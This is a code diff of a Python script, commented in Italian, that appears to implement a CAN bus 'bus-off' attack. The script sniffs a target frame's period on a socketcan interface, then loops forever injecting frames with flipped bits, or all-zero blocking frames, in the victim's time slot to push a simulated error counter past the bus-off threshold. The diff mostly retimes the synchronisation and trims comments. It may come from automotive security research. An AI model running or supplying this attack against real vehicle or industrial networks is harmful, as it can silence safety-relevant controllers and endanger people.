@@ -31,7 +31,6 @@ def find_and_flip(data_bytes):
     modified_bit_string = list(original_bit_string)
     flip_index = -1
     
-    # Cerchiamo il primo '1' (Recessivo)
     for i in range(len(modified_bit_string)):
         if modified_bit_string[i] == '1':
             modified_bit_string[i] = '0' # Flip a Dominante (0)
@@ -51,7 +50,6 @@ def find_and_flip(data_bytes):
 def start_attacker_dynamic_final_corrected():
     
     try:
-        # received_own_messages=False è CRUCIALE per non ricevere le proprie eco
         bus = can.interface.Bus(channel=CAN_INTERFACE, interface='socketcan', receive_own_messages=False)
         print(f"✅ [Attaccante] Connesso a {CAN_INTERFACE}.")
     except OSError as e:
@@ -66,7 +64,7 @@ def start_attacker_dynamic_final_corrected():
     # Variabili per la stima del periodo
     timestamps = []
     estimated_period = 0.0
-    last_sniff_time = time.time()
+    last_attack_time = time.time()
 
     # ==========================================================
     # --- FASE 1: STIMA SEQUENZIALE DELLA FREQUENZA (Sniffing) ---
@@ -88,7 +86,7 @@ def start_attacker_dynamic_final_corrected():
                 estimated_period = (timestamps[-1] - timestamps[0]) / (len(timestamps) - 1)
                 
     if timestamps:
-        last_sniff_time = timestamps[-1]
+        last_attack_time = timestamps[-1]
     
     print(f"✅ [Attaccante] Stima completata. Periodo stimato (T): {estimated_period:.3f}s")
     if estimated_period < 0.01: estimated_period = 5.0
@@ -101,18 +99,20 @@ def start_attacker_dynamic_final_corrected():
     while True: # Loop infinito per la persistenza
         
         # 1. SINCRONIZZAZIONE (Attesa reattiva)
-        time_to_next_msg = last_sniff_time + estimated_period - time.time()
+        next_expected_time = last_attack_time + estimated_period
+        time_to_wait = next_expected_time - time.time()
         
-        if time_to_next_msg > 0:
-            # Aspetta fino a poco prima del messaggio atteso (5ms prima)
-            time.sleep(time_to_next_msg - 0.005) 
+        if time_to_wait > 0:
+            time.sleep(time_to_wait - 0.005) # Aspetta fino a 5ms prima
             
         # 2. RICEZIONE/SNIFFING DEL MESSAGGIO VITTIMA
         reference_msg = bus.recv(timeout=0.01) 
         current_time = time.time()
 
         if reference_msg is not None and reference_msg.arbitration_id == TARGET_ID:
-            last_sniff_time = current_time # Aggiorna il tempo base per il prossimo ciclo
+            
+            # AGGIORNAMENTO CRITICO: La nuova base è il tempo atteso per mantenere la frequenza T
+            last_attack_time = next_expected_time 
             
             # 3. LOGICA TEC SIMULATA E STAMPA
             if victim_tec_sim < BUS_OFF_THRESHOLD:
@@ -150,32 +150,31 @@ def start_attacker_dynamic_final_corrected():
                         is_extended_id=False
                     )
                     bus.send(msg_attack)
-                    print(f"💣 [Attaccante] Iniettato Bit Error al bit #{flip_index}. Payload alterato: {bytes_to_bitstring(modified_data)}.")
+                    print(f"💣 [Attaccante] Iniettato Bit Error al bit #{flip_index}.")
                     
                 except can.CanError:
                     print("⚠️ Errore CAN durante l'invio.")
                     pass 
             else:
-                 # Se non ci sono '1' da flippare, invia un frame di blocco generico
                  bus.send(can.Message(arbitration_id=TARGET_ID, data=[0x00]*8, is_extended_id=False))
-                 print("⚠️ Impossibile flippare (payload tutto Dominante). Inviato frame di blocco generico.")
+                 print("⚠️ Impossibile flippare, Attaccante invia frame di blocco generico.")
             
             attack_counter += 1
 
         else:
-            # Se la Vittima non trasmette nello slot atteso (jitter o Vittima ferma)
+            # 3. CASO DI FALLIMENTO (JITTER o Vittima ferma)
             if victim_tec_sim >= BUS_OFF_THRESHOLD:
-                # Continua la persistenza iniettando un frame di blocco generico
+                # Continua la persistenza
                 print(f"\n--- CICLO PERSISTENTE #{attack_counter+1} ({time.strftime('%H:%M:%S')}) ---")
                 bus.send(can.Message(arbitration_id=TARGET_ID, data=[0x00]*8, is_extended_id=False))
                 attack_counter += 1
             else:
-                # La Vittima ha jitterato: proviamo a risincronizzare
+                # Vittima ha jitterato: Aggiorniamo la base per il prossimo tentativo.
                 print(f"\n--- CICLO SKIPPATO ({time.strftime('%H:%M:%S')}) ---")
                 print("⚠️ Messaggio Vittima non rilevato. Riprovo al prossimo slot...")
                 
         # Aggiorna il tempo base di attacco per l'iterazione successiva
-        last_sniff_time = last_sniff_time + estimated_period
+        last_attack_time = last_attack_time + estimated_period
 
     bus.shutdown()
     print("\n🛑 [Attaccante] Disconnesso.")
